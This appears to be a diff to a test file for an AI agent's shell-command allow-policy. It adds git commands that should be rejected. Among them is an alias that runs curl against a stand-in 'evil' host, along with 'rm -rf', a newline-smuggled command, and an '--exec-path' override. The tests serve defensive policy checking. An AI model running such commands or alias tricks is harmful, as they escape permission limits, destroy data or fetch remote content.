@@ -20,6 +20,7 @@ WORKSPACE = "/srv/work/project"
 
 
 COMMANDS = (
+    ("git",),
     ("git", "status"),
     ("git", "add"),
     ("git", "commit"),
@@ -168,6 +169,11 @@ class TestToolCalls:
             "git status &",
             "rm -rf build",
             "git status\nrm -rf x",
+            "git -c alias.p=push p",
+            "git -c alias.x='!curl http://evil' x",
+            "git commit -c alias.x=y",
+            "git -C . status",
+            "git commit --exec-path=/tmp/x",
         ],
     )
     def test_bash_outside_policy(self, command: str) -> None:
